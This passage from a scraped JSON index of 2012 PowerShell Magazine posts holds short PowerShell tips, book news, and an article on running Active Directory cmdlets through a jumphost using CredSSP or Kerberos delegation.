SynTPLpr.exe SynTPHelper.exe SyncServer.exe And sure enough, we get the same result!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/09/manipulating-wildcards/","tags":["How To"],"title":"Manipulating Wildcards"},{"categories":["Tips and Tricks"],"contents":"There are a lot of ways to remove the first line from a text file. I hope you will find a multiple assignment technique interesting. Here is what you need to do:\nPS C:\\\u0026gt; $a,$b = Get-Content .\\test.txt PS C:\\\u0026gt; $b \u0026gt; .\\test.txt  The first line of the test.txt file is asigned to the $a variable, the rest of the file goes to the variable $b, and then you write a content of the $b variable to the test.txt file by using \u0026gt; redirection operator.\nBut wait, there is more! You can turn that into a one-liner:\nPS C:\\\u0026gt; $a, ${c:test.txt} = Get-Content .\\test.txt   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/08/pstip-how-to-remove-the-first-line-from-a-text-file/","tags":["Tips and Tricks"],"title":"#PSTip How to remove the first line from a text file"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 and above\nThere are many ways to get the age of a file. The most common way is to subtract the file’s LastWriteTime from the current time:\nPS\u0026gt; $now = Get-Date PS\u0026gt; $prof = Get-ChildItem $PROFILE PS\u0026gt; ($now - $prof.LastWriteTime).Days 280  Or by using the Subtract method:\nPS\u0026gt; $now.Subtract($prof.LastWriteTime).Days 280  There is another way to get the information using a less known method of piping a file system object to the New-TimeSpan cmdlet:\nPS\u0026gt; ($prof | New-TimeSpan).Days 280  The Start parameter of the New-TimeSpan cmdlet has a LastWriteTime parameter Alias which automatically bind the value of the incoming file system object\nPS\u0026gt; (Get-Command New-TimeSpan).Parameters.Start Name : Start ParameterType : System.DateTime ParameterSets : {[Date, System.Management.Automation.ParameterSetMetadata]} IsDynamic : False Aliases : {LastWriteTime} Attributes : {System.Management.Automation.AliasAttribute, Date} SwitchParameter : False Here’s an example of all DLL file’s age in PowerShell’s installation directory\nPS\u0026gt; $age = @{Name='Age(Days)'; Expression={($_ | New-TimeSpan ).Days }} PS\u0026gt; Get-ChildItem $PSHOME -Filter *.dll | Select-Object Name,$age Name Age(Days) ---- --------- PSEvents.dll 68 pspluginwkr-v3.dll 68 pspluginwkr.dll 121 pwrshmsg.dll 68 pwrshsip.dll 68 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/05/pstip-get-old-files-based-on-lastwritetime/","tags":["Tips and Tricks"],"title":"#PSTip Get old files based on LastWriteTime"},{"categories":["News"],"contents":"The popular PowerShell Cookbook, by Lee Holmes, has reached its 3rd edition and is updated for PowerShell 3.0. The book has not yet been released and is available for pre-order.\nBook Description Do you know how to use Windows PowerShell to navigate the filesystem and manage files and folders? Or how to retrieve a web page? This introduction to the PowerShell language and scripting environment provides more than 400 task-oriented recipes to help you solve the most complex and pressing problems, and includes more than 100 tried-and-tested scripts that intermediate to advanced system administrators can copy and use immediately.\nYou’ll find hands-on tutorials on fundamentals, common tasks, and administrative jobs that you can apply whether you’re on the client or server version of Windows. You also get quick references to technologies used in conjunction with PowerShell, including format specifiers and frequently referenced registry keys to selected .NET, COM, and WMI classes.\n Learn how to use the version of PowerShell on Windows 8 and Windows Server 2012 Tour PowerShell’s core features, including the command model, object-based pipeline, and ubiquitous scripting Master fundamentals such as the interactive shell and fundamental pipeline and object concepts Perform common tasks that involve working with files, Internet-connected scripts, user interaction, and more Solve tasks in systems and enterprise management, such as working with Active Directory and the filesystem  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/05/windows-powershell-cookbook-3rd-edition/","tags":["News"],"title":"Windows PowerShell Cookbook 3rd edition"},{"categories":["News"],"contents":"It\u0026rsquo;s published! Microsoft PowerShell 3.0 First Look, by Adam Driscoll, is a concise overview of the up and coming features and enhancements to PowerShell. Through easy to understand examples readers will quickly get up to speed with the latest version. The book covers some of the exciting new features such as PowerShell Workflow and the new CIM cmdlets. In addition, the reader will learn about enhancements to areas such as PowerShell Remoting and the file system provider. Finally, the book highlights some of the modules and cmdlets found in Windows Server 2012 and Windows 8.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/05/new-book-microsoft-powershell-3-0-first-look/","tags":["News"],"title":"New Book: Microsoft PowerShell 3.0 First Look"},{"categories":["Tips and Tricks"],"contents":"When working with dates in PowerShell it is often useful to leverage the .NET Framework System.DateTime class. For example to display the current date and time the Now method can be used:\n[System.DateTime]::Now  [System.DateTime] can be shortened to [DateTime] as shown in the following example, where it is used incombination with the Today method to display the current date:\n[DateTime]::Today  When working with time stamps found in Active Directory the FromFileTime method can be used to convert the file time to a human readable format.\n[DateTime]::FromFileTime(129955032000000000)  Another very useful feature is the ParseExact method that is included in this class. It transforms a string into a DateTime object. It can be used to convert almost any type of date by specifying the format using the MM-dd-yyyy notation. Running the following command will create a DateTime object that display the date correctly as the 16th of May, 2005.\n[DateTime]::ParseExact('16@05==5','dd@MM==y',$null)  For more information about the DateTime methods available in this class, please refer to this MSDN article: http://msdn.microsoft.com/en-us/library/497a406b.aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/04/pstip-working-with-datetime-objects-in-powershell-using-system-datetime/","tags":["Tips and Tricks"],"title":"#PSTip Working with DateTime objects in PowerShell using [System.DateTime]"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 and above\nI have always wanted to see what all PowerShell profiles are defined and in-use on a system. Sometimes, this is very crucial to understand what exactly is causing errors in scripts.\nThe $PROFILE automatic variable shows the current PowerShell Profile in use within the host. Now, a less known fact is that the $PROFILE also has extended properties that show different PowerShell path properties.\nLet us see how we can use this to find all PowerShell profiles in use.\nfunction Get-PSProfile{ $PROFILE.PSExtended.PSObject.Properties | Select-Object Name,Value,@{Name='IsExist';Expression={Test-Path -Path $_.Value -PathType Leaf}} }  This gives us an output similar to:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/03/pstip-find-all-powershell-profiles-from-profile/","tags":["Tips and Tricks"],"title":"#PSTip Find all PowerShell Profiles from $PROFILE"},{"categories":["Tips and Tricks"],"contents":"In the last tip, I showed you how to create an enumeration object on which we can do bitwise operations to derive combinational values. Now, in this tip, let us see how to retrieve all possible combinations.\nAssuming that we forgot the values assigned to each enumeration constant, let us first see how to see the values of each constant:\n[Enum]::GetValues([Scripting.Skill]) | % { \"{0,3} {1}\" -f $([int]$_),$_ }  So, this gives us something similar to:\nSince the total of all these values is 31, let us use how to derive all possible combinations.\nfor ($i = 0; $i -lt 31; $i++) { \"{0,3} {1}\" -f $([int]$i), [Scripting.Skill]$([int]$i) }  This output is generally longer! So, try it yourself!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/02/pstip-displaying-all-possible-combinations-of-a-flagged-enumeration/","tags":["Tips and Tricks"],"title":"#PSTip Displaying all possible combinations of a flagged enumeration"},{"categories":["Tips and Tricks"],"contents":"At times, we may want to create an enumeration object in which a combination of different constants means different values or descriptions. For example, look at this scripting skill set enumeration:\nnamespace Scripting { public enum Skill { Batch = 1, VBScript = 2, Perl = 4, Python = 8, PowerShell = 16 } }  From the above enumeration, we can derive the skill set value for a person. But, what if we want to derive a set of all scripting skills he/she holds? or what if we want to assign a value to a person to denote that he knows all these scripting languages or skills?\nThe general enumeration constants won’t let us do this. This is where the FlagsAttribute class will help us. Here is how the MSDN article distinguishes regular enumeration constants from those defined with FlagsAttribute:\n Bit fields are generally used for lists of elements that might occur in combination, whereas enumeration constants are generally used for lists of mutually exclusive elements. Therefore, bit fields are designed to be combined with a bitwise OR operation to generate unnamed values, whereas enumerated constants are not. Languages vary in their use of bit fields compared to enumeration constants.\n Now that we understand why we need FlagsAttribute, let us see a quick example on how to build these enum objects:\n$enum = \u0026quot; using System; namespace Scripting { [FlagsAttribute] public enum Skill { Batch = 1, VBScript = 2, Perl = 4, Python = 8, PowerShell = 16 } } \u0026quot; Add-Type -TypeDefinition $enum -Language CSharpVersion3 We can access the enumeration we just created by using the namespace [Scripting.Skill]\nThis is it. Now, a person who knows all these scripting languages will have an enumeration value of 31.\nHow do I know that? Let us see that in a subsequent #PSTip. 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/10/01/pstip-creating-flagged-enumerations-in-powershell/","tags":["Tips and Tricks"],"title":"#PSTip Creating flagged enumerations in PowerShell"},{"categories":["Wallpapers"],"contents":"This week I was busy preparing a PowerShell workshop I’m delivering next week and this is my first workshop on my new laptop with Windows 8 RTM installed on it. And when taking a short break I stumbled upon some PowerShell wallpapers on the PowerShell Magazine website. And because it’s pretty easy to configure your own Windows 8 lock screen, I made some slight adjustments to the original wallpapers.\nIf you also want to configure your Windows 8 lock screen you need to follow these steps.\n  Download one of the Keep Calm Lock Screen images from PowerShell Magazine Wallpapers’ page\n  Save the file somewhere on your Windows 8 machine.\n  Go to Windows 8 Start Screen (Hit Windows key)\n  Click on your username (right top corner of Start Screen).   Click on Change account picture.\n  Click on Lock screen   Select Browse and choose the file you have downloaded in step 1 and you are done.   Have fun with your new Windows 8 PowerShell lock screen.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/28/windows-8-powershell-lock-screen/","tags":["Wallpapers"],"title":"Windows 8 PowerShell Lock Screen"},{"categories":["Tips and Tricks"],"contents":"In PowerShell 3.0, we no longer have to import modules manually to use cmdlets. When we run a cmdlet, Windows PowerShell imports the module that contains the command automatically. In addition, the Get-Command cmdlet now returns all cmdlets installed on the system, even if they are not in the current session.\nWe can enable, disable, and configure automatic importing of modules by using the $PSModuleAutoLoadingPreference preference variable. Valid values for this variable are: None, ModuleQualified, or All.\n   All Module auto-loading works for all commands. To import a module, get or use any command in the module.     None Module auto-loading is turned off. To import a module, use the Import-Module cmdlet.   ModuleQualified Modules are imported automatically only when a user uses the module-qualified name of a command. For example, if the user types “MyModule\\MyCommand”, Windows PowerShell imports the MyModule module.    Alternatively, we can limit the command search scope and get only commands in the current session with the -ListImported switch parameter.\nGet-Command \u0026lt;CommandName\u0026gt; -ListImported   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/27/cmdlet-discovery-and-module-auto-loading/","tags":["Tips and Tricks"],"title":"#PSTip Cmdlet Discovery and Module auto-loading"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0.\nBefore you start using PowerShell 3.0, learn about the Updatable Help feature first. The about_Updatable_Help help topic is a good place to start. Also, the Hey, Scripting Guy! blog has published two blog posts written by June Blender, a senior programming writer on the Windows PowerShell team–Understanding and Using Updatable PowerShell Help and Where is PowerShell Updatable Help for Windows Modules?. June is responsible for most of the PowerShell help topics, thus there is no better person to talk about these subjects.\nTomorrow night (9/27), the PowerScripting Podcast’s dynamic duo (Hal and Jon) will be speaking to June about Updatable Help and other exciting new features of windows PowerShell 3.0. Be sure to join them live tomorrow at 9:30 PM EDT at live.powerscripting.net!\nToday’s tip is inspired by June’s script from one of the mentioned blog posts and will show you a different approach to find versions of modules’ Help files that you have installed on your machine:\ndir $pshome\\*helpinfo.xml -Recurse | foreach { $modulename = ($_.Name -split '_')[0] $UICultures = ((Get-Content $_)).HelpInfo.SupportedUICultures.UICulture $UICultures | foreach { [pscustomobject]@{ ModuleName = $modulename Version = $_.UICultureVersion UICulture = $_.UICultureName } } }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/26/pstip-how-do-you-tell-which-version-of-a-modules-help-files-you-have-installed/","tags":["Tips and Tricks"],"title":"#PSTip How do you tell which version of a module’s Help files you have installed?"},{"categories":["Tips and Tricks"],"contents":"When you run the new Update-Help cmdlet in PowerShell 3.0, it downloads and installs Help files, but you also get HelpInfo XML files. You can find them in $pshome and its subfolders. They are always named in the same way–ModuleName_GUID_HelpInfo.xml.\nIn the following command you will iterate through the $pshome folder and use that consistent naming scheme of HelpInfo files to find all system modules for which you have downloaded Help files:\nPS\u0026gt; dir $pshome\\*HelpInfo.xml -Recurse | foreach { ($_.name -split '_')[0] }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/25/for-which-system-modules-have-you-downloaded-updatable-help-files/","tags":["Tips and Tricks"],"title":"#PSTip For which system modules have you downloaded updatable help files?"},{"categories":["Active Directory"],"contents":"I’ve stumbled upon a question someone posted in the Minasi forum, about having to create a script for some managers to connect to AD and make some changes on their subordinates. Company policy did not allow these managers to connect directly to the Domain controllers, so they had to go through a jumphost.\nThe admin writing the script had installed both the Microsoft AD cmdlets and the Quest ActiveRoles management cmdlets on the jumphost. Everything worked fine when the script was run on the jumphost directly, but when running the script from a client machine using remoting both the Microsoft AD cmdlets and the Quest cmdlets failed with an error.\nMy initial thought was that this guy must be doing something wrong. How hard can it be to execute Get-ADUser or Get-QADUser to return some information about an AD user and then change a few settings.\nSo I set out to try it out. I already had a jumphost that my colleagues and our tech support guys are using to run different scripts/tools. The main difference is that my jumphost is also running Remote Desktop services, so people tend to RDP in and execute the scripts on the server, which works perfectly.\nTherefore, I’ve tried to list all users using Get-QADUser and Invoke-Command against my jumphost server:\nInvoke-Command -ComputerName RemoteMgmt -ScriptBlock {Add-PSSnapin *Quest*; Get-QADUser}  The error message hasn’t said much. My initial though was that there was some issue loading the Quest snap-in in a remoting session.\nTo test that theory I wanted to try to load the Microsoft AD cmdlets module instead, to see if that would work:\nInvoke-Command -ComputerName RemoteMgmt -ScriptBlock {Import-Module *Active*; Get-ADUser -filter *}  I’ve got an error message again.\n(In the above examples I use Import-Module *active* and Add-PSSnapin *quest* for brevity, and I know there are no modules/snap-ins with similar names on my test systems. The full command in the above examples would be:\nAdd-PSSnapin -Name Quest.ActiveRoles.ADManagement and Import-Module -Name ActiveDirectory  This error message tells me that it is unable to connect to the Active Directory Web Services, and that the server is down or non-existent. I was sure I would have heard if all of our 2008R2 domain controllers suddenly had ceased to exist.\nJust to make sure, I connected to the server using RDP and tested both the Quest and Microsoft AD cmdlets directly from the server, and both worked flawlessly. But this also hinted to me that the problem might be the classic double-hop authentication issue.\nSo,in order to test that out, I decided to try and use CredSSP to connect to the jumphost. Since I did not have CredSSP enabled on my machines per default I had to set it up. On the jumphost I invoked:\nEnable-WSManCredSSP -Role Server  (Remember there is always a security risk when you enable delegation of user credentials.)\nOn the client I invoked (RemoteMgmt is the name of the jumphost.):\nEnable-WSManCredSSP -Role Client -DelegateComputer RemoteMgmt  Now let’s try our command again, but this time using CredSSP:\nInvoke-Command -ComputerName RemoteMgmt -ScriptBlock {Add-PSSnapin *quest*;Get-QADUser} -Authentication CredSSP -Credential (Get-Credential)  This time the command executes without any problems. When you use CredSSP authentication, you have to explicitly specify credentials.\nAnother thing to be aware of when enabling CredSSP is that it is possible to use wildcards. Let’s say you have a “client” machine that has to connect to multiple machines in your domain. You can specify a wildcard like so:\nEnable-WSManCredSSP -Role Client -DelegateComputer *.bigbusinness.com  The client will allow credential delegation to happen when connecting to all machines in the *.bigbusiness.com domain.\nLet’s say I tried to run the above example (only using the hostname) after having enabled CredSSP using a wildcard:\nInvoke-Command -ComputerName RemoteMgmt -ScriptBlock {Add-PSSnapin *quest*;Get-QADUser} -Authentication Credssp -Credential (Get-Credential)  It fails with an error message that might lead you on a wild goose chase looking through policy settings. The solution is to use the FQDN instead of just a hostname:\nInvoke-Command -ComputerName RemoteMgmt.bigbusiness.com -ScriptBlock {Add-PSSnapin *quest*;Get-QADUser} -Authentication Credssp -Credential (Get-Credential)  Another way to make it work is to enable Kerberos delegation for the jumphost.This can be done by going to Active Directory Users and Computers, find the jumphost machine, open properties and select “Delegation”\n(Again here you can choose to lock down delegation even further, but that is not the purpose of this article.)\nThen you can run the command like this:\nInvoke-Command -ComputerName RemoteMgmt -ScriptBlock {Add-PSSnapin *quest*;Get-QADUser} -Authentication Kerberos  Notice that with Kerberos authentication it is not required to specify a credential object.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/25/managing-active-directory-using-a-jumphost-and-remoting/","tags":["Active Directory"],"title":"Managing Active Directory using a jumphost and remoting"},{"categories":["Tips and Tricks"],"contents":"With the Format-Table cmdlet we format and display a tabular format of an output, We can also select and display output of selected properties of objects.\nGet-Process | Format-Table Name,StartTime  You can also use a hash table to add calculated properties to an object before displaying it. The following command displays a table with the Name and StartTime of all processes on the local computer (not all processes have this property set). The StartTime is formatted using .NET format specifiers to display the date in mm/dd/yy format.\nGet-Process | Format-Table Name,@{Name='StartDate';Expression={\"{0:d}\" -f $_.StartTime}}  But there’s a better, built-in, PowerShell way to do this, one that doesn’t invole the traditional .NET way of string formatting (e.g ‘{0}’):\nGet-Process | Format-Table Name,@{Name='StartDate';Expression={$_.StartTime};FormatString=\"d\"}  Using the FormatString key (available in v2 and above), all you need to do is specify the modifier itself, PowerShell will do the rest.\nAnd as you probably know, the hash table keys can be specified by just their first letter, so the following is also valid:\nGet-Process | Format-Table Name,@{n='StartDate';e={$_.StartTime};f=\"d\"}  Note: Calculated properties can be used using the Select-Object cmdlet but unfortunately the FormatString cannot be used with it. I logged a suggestion so add your vote if you want to have this option in Select-Object.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/24/pstip-advanced-object-formatting/","tags":["Tips and Tricks"],"title":"#PSTip Advanced object formatting"},{"categories":["Tips and Tricks"],"contents":"In Windows PowerShell 2.0, if we had to list a complete list of cmdlets that had a specific parameter, we could have done it in a couple of different ways:\nGet-Help * -Parameter ComputerName  or we can examine the cmdlet meta returned by Get-Command cmdlet!\nGet-Command * | Where {$_.Definition -like \"*-ComputerName*\"}  In PowerShell 3.0, Get-Command cmdlet provides a simple way to do this.\nGet-Command -ParameterName ComputerName   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/21/pstip-list-all-cmdlets-with-a-specified-parameter-the-powershell-3-0-way/","tags":["Tips and Tricks"],"title":"#PSTip List all cmdlets with a specified parameter – The PowerShell 3.0 way!"},{"categories":["Tips and Tricks"],"contents":"Each PowerShell drive (PSDrive) has its own notion of current working directory (CurrentLocation):\nPS C:\\\u0026gt; Get-PSDrive d,c Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- D 295.59 102.49 FileSystem D:\\ C 277.61 205.11 FileSystem C:\\ temp In the variable notation, if the path after the drive specifier is a relative path, then it will be resolved relative to the current working directory for the specified drive. If the drive is not specified, then the current directory for the current drive is used.\n ${c:\\test.txt} refers to the file in the root of the C: drive ${c:test.txt} refers to the file in the current working directory on the C: drive ${test.txt} refers to the file in the current working directory on the current drive  This works for commands as well:\n# look up test.txt file in the root of the C: drive PS C:\\temp\u0026gt; Get-Content C:\\test.txt # look up test.txt file relative to the current directory for the C: drive # in this case that's C:\\temp\\test.txt PS C:\\temp\u0026gt; Get-Content C:test.txt # look up test.txt relative to the current directory on the current drive PS C:\\temp\u0026gt; cd D: PS D:\\\u0026gt; # in this case that's D:\\test.txt PS D:\\\u0026gt; Get-Content test.txt ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/20/pstip-whats-the-difference-between-ctest-txt-ctest-txt-and-test-txt/","tags":["Tips and Tricks"],"title":"#PSTip What’s the difference between ${c:\\test.txt}, ${c:test.txt}, and ${test.txt}"},{"categories":["Tips and Tricks"],"contents":"When working with objects in the console you may have seen a display that resembles the following:\nPS\u0026gt; Get-Process s* | Select-Object Name,Threads -First 5 Name Threads ---- ------- SearchIndexer {5092, 2732, 1100, 2040...} services {656, 700, 764, 6100...} shstat {4440, 4672, 4196, 4232...} SkyDrive {2696, 4352, 4604, 448...} smss {268, 428} Notice that the Threads column is showing 4 thread values and then it adds an ellipsis (…) to indicate that there are more items that are not shown.\nPowerShell do this regardless of console window size.\nPowerShell determines how many items to include in the the display using the $FormatEnumerationLimit preference variable.\nAs you already seen, it’s default value is 4, but we can change it and display more values.\nPS\u0026gt; $FormatEnumerationLimit = 7 PS\u0026gt; Get-Process s* | Select-Object Name,Threads -First 5 Name Threads ---- ------- SearchIndexer {5092, 2732, 1100, 2040, 400, 3036, 3120...} services {656, 700, 764, 5168, 1612, 5104, 6560} shstat {4440, 4672, 4196, 4232, 3548, 2384, 1872...} SkyDrive {2696, 4352, 4604, 448, 1816, 2332, 1688...} smss {268, 428} Want to reveal all values regardless of their count? Set $FormatEnumerationLimit to -1 (undocumented).\nNote: The value does not affect the underlying objects, just the display.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/19/pstip-how-to-improve-the-display-of-enumerated-items/","tags":["Tips and Tricks"],"title":"#PSTip How to improve the display of enumerated items"},{"categories":["Tips and Tricks"],"contents":"Using the GetHostEntry static method of the .NET Framework System.Net.Dns class it is possible to resolve IP address or a host name:\n[System.Net.Dns]::GetHostEntry('computer1') HostName Aliases AddressList -------- ------- ----------- computer1.jaapbrasser.com {} {fe80::99e1:800d:6c35:e406%10, 10.0.0.1} If the IP address is what is required then the following PowerShell 3.0 syntax can be used:\n[System.Net.Dns]::GetHostEntry('localhost').AddressList.IPAddressToString  To filter only IPv4 addresses the following filter can be added:\n[System.Net.Dns]::GetHostEntry('localhost').AddressList.IPAddressToString | Where-Object {$_ -match '\\.'}  To filter only IPv6 addresses just change the operator from -match to -notmatch. For a full list of the available methods in this .NET class the following command can be used:\n[System.Net.Dns] | Get-Member -MemberType method -Static  A full description of this .NET class can be found at MSDN:http://msdn.microsoft.com/en-us/library/b8hth2dy\nEditor\u0026rsquo;s note The formal way to filter IPv4 address only would be by comparing against the AddressFamily property:\n[System.Net.Dns]::GetHostEntry('localhost').AddressList | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | ForEach-Object {$_.IPAddressToString}  For a complete list of AddressFamily values, see the AddressFamily Enumeration page on MSDN\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/18/pstip-resolve-ip-address-or-a-host-name-using-net-framework/","tags":["Tips and Tricks"],"title":"#PSTip Resolve IP Address or a host name using .NET Framework"},{"categories":["Tips and Tricks"],"contents":"Our editors at the PowerShell Magazine are doing a great job pushing daily PowerShell tips and tricks to our readers. Now, wouldn’t it be great if you can get access to these tips right from your console?\nYes, it is easy. In fact, PowerShell 3.0 makes it way too easy. Check this:\nFunction Get-PSTip { param ( [switch]$Multiple ) $url = Invoke-RestMethod -Uri \u0026quot;http://bit.ly/QwjgRd\u0026quot; if ($Multiple) { $selectedTips = $url | Select-Object Title, Link | Out-GridView -PassThru if ($selectedTips) { $selectedTips | Foreach-Object { Start-Process $_.Link } } } else { Start-Process $url[0].Link } }  This is it. Add this simple code snippet to your PowerShell profile and then every time you run, Get-PSTip, you will have the latest tip served right from your console or PowerShell ISE prompt. Also, you can use Get_-PSTip_ with _-Multiple_ parameter to select a tip from the list and open that in browser.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/17/pstip-get-powershell-magazines-daily-tips-right-from-your-console/","tags":["Tips and Tricks"],"title":"#PSTip Get PowerShell Magazine’s daily tips right from your console!"},{"categories":["Tips and Tricks"],"contents":"When you need to create a collection of strings and operate on each of them you’d go with something like:\n'one','two','three','four','five' | ForEach-Object { $_ }  As you can see, and your fingers probably feel, those strings needs to be quoted and comma delimited before they can be written to the pipeline. One way to avoid this is to create a helper function (coming from Perl), Quote-List (or ql for short):\nPS\u0026gt; function ql { $args } PS\u0026gt; ql one two three four five | ForEach-Object { $_ }  The function takes a list of unquoted arguments and returns a collection of strings. That’s cool but it requires you to create the ql function or make sure it’s present on all systems you intend to use it on. Actually, there’s a better, built-in way, of doing this without having to create helper function. The answer is the Write-Output cmdlet. In the following example, I’m using Write-Output’s ‘echo’ alias:\nPS\u0026gt; echo one two three four five | ForEach-Object { $_ }  If you can’t live without commas, this is also valid:\nPS\u0026gt; echo one,two,three,four,five | ForEach-Object { $_ }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/13/pstip-a-quick-list-of-strings/","tags":["Tips and Tricks"],"title":"#PSTip A quick list of strings"},{"categories":["News"],"contents":"Last year, on this day, we announced the launch of PowerShell Magazine. It has been an interesting year. We are proud to say that we are the exclusive PowerShell online magazine and proud of what we have achieved so far!\nSome highlights from last year are:\n Published 160+ posts written predominantly by the PowerShell community members. Posted a series of video interviews (from PowerShell Deep Dive, 2011 Europe \u0026amp; TechEd NA) of several PowerShell MVPs and other experts from the community. This was a huge hit! Invited community members to write their PowerShell learning experiences. Our readers loved it! First to cover PowerShell 3.0 announcements from BUILD conference. Ran a series of brain teaser columns. They are still in the list of top posts. Started a daily PowerShell tips \u0026amp; tricks column! Do check out, if you have not seen this already. Partnered with Microsoft to develop PowerShell 3.0 cheat sheets! This was a great hit. If you have attended TechEd NA 2012 and TechEd Europe 2012, you must have got a print of these. Covered PowerShell news from all corners of the world.   Last but not least, we gathered a good reader base. We have 160, 000 visits so far with the day average recently reaching 1000 visits. On our busiest day, we have had more than 2000 visitors!  If I am not very happy about one thing, it would be the missing PDF or mobi version of the magazine. I wrote in the inaugural post that we will have a monthly downloadable PDF version of the magazine. This is something we have not done so far. We are working at this and is certainly on top of our TODO list. We are making slow progress towards this but nonetheless, we are making progress.\nWe are not a revenue generating or a profit center. We are neither hosted nor have a corporation supporting this initiative. We are just a group of individuals trying to bring the community together to help newbies learn PowerShell and spread the love for PowerShell. To me, this community means a lot. It is not about a single individual trying to force his/her intentions or interests. At PowerShell Magazine, we totally understand this and respect the community. Our contributors know this very well.\nBy the way , if you want to be a contributor, just head to ‘Write for us‘ and submit a proposal! And, if you have any feedback or suggestions, please use the feedback form. We would love to hear from you.\nWe want to take this opportunity to thank and congratulate the community members who made this venture a success. We look forward to strengthening this community and I am sure we have a great year ahead.\nHappy Birthday, PowerShell Magazine!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/13/happy-birthday-powershell-magazine/","tags":["News"],"title":"Happy Birthday, PowerShell Magazine!"},{"categories":["Tips and Tricks"],"contents":"It’s pretty easy to find path to your Documents folder with a little help from .NET Framework’s Environment class:\nPS\u0026gt; [Environment]::GetFolderPath('MyDocuments') C:\\Users\\Administrator\\Documents  You can accomplish the same using the identifier name Personal:\nPS\u0026gt; [Environment]::GetFolderPath('Personal') C:\\Users\\Administrator\\Documents  How can you find all valid names? Specify a wrong name, and PowerShell will help you 🙂\nPS\u0026gt; [environment]::GetFolderPath('wrongvalue') Cannot convert argument \"folder\", with value: \"wrongvalue\", for \"GetFolderPath\" to type \"System.Environment+SpecialFolder\": \"Cannot convert value \"wrongvalue\" to type \"System.Environment+SpecialFolder\". Error: \"Unable to match the identifier name wrongvalue to a valid enumerator name. Specify one of the following enumerator names and try again: Desktop, Programs, Personal, MyDocuments, Favorites, Startup, Recent, SendTo, StartMenu, MyMusic, MyVideos, DesktopDirectory, MyComputer, NetworkShortcuts, Fonts, Templates, CommonStartMenu, CommonPrograms, CommonStartup, CommonDesktopDirectory, ApplicationData, PrinterShortcuts, LocalApplicationData, InternetCache, Cookies, History, CommonApplicationData, Windows, System, ProgramFiles, MyPictures, UserProfile, SystemX86, ProgramFilesX86, CommonProgramFiles, CommonProgramFilesX86, CommonTemplates, CommonDocuments, CommonAdminTools, AdminTools, CommonMusic, CommonPictures, CommonVideos, Resources, LocalizedResources, CommonOemLinks, CDBurning\"\"   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/12/pstip-how-to-find-path-to-your-documents-folder/","tags":["Tips and Tricks"],"title":"#PSTip How to find path to your Documents folder"},{"categories":["Tips and Tricks"],"contents":"In PowerShell version 2.0, when we had to check if a given file or folder is older or newer, we would do that using:\n#Test for newer item in PowerShell v2 Get-Item C:\\Scripts | Where-Object { $_.LastWriteTime -ge \u0026quot;August 19, 2012 2:00 PM\u0026quot;} #Test for Older item in PowerShell v2 Get-Item C:\\Scripts | Where-Object { $_.LastWriteTime -le \u0026quot;August 30, 2012 2:00 PM\u0026quot;} In PowerShell 3.0, this is much simpler. Thanks to the -OlderThan and -NewerThan parameters of Test-Path cmdlet. When we use these parameters, based on the test condition the resulting output is either True or False.\n#Test for newer item in PowerShell v3 Test-Path -Path C:\\Scripts -NewerThan \u0026quot;August 30, 2012 2:00 PM\u0026quot; #Test for older item in PowerShell v3 Test-Path -Path C:\\Scripts -OlderThan \u0026quot;August 30, 2012 2:00 PM\u0026quot; It is not always date literals. You can also use the [datetime] object to compare. For example,\nTest-Path -Path C:\\Scripts -OlderThan (Get-Date).AddDays(-20)  Now, if you want to get a list of files older than a given date in a recursive way,\nGet-ChildItem -Recurse | ? { Test-Path -Path $_.FullName -OlderThan \"August 10, 2011 2:00 PM\" }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/11/pstip-test-files-and-folders-for-last-write-time-the-powershell-3-0-way/","tags":["Tips and Tricks"],"title":"#PSTip Test files and folders for last write time – the PowerShell 3.0 way!"},{"categories":["Tips and Tricks"],"contents":"The Windows Explorer Preview Pane can display the contents of text files, graphics, and other file types without having to use external software.\nTo add new file types to preview, such as PowerShell scripts, run the following command:\nPS\u0026gt; Set-ItemProperty Registry::HKEY_CLASSES_ROOT\\.ps1 -Name PerceivedType -Value text  Here’s how it looks in regedit.exe after the value has been added.\nNow navigate to your scripts folder and select a script file. If 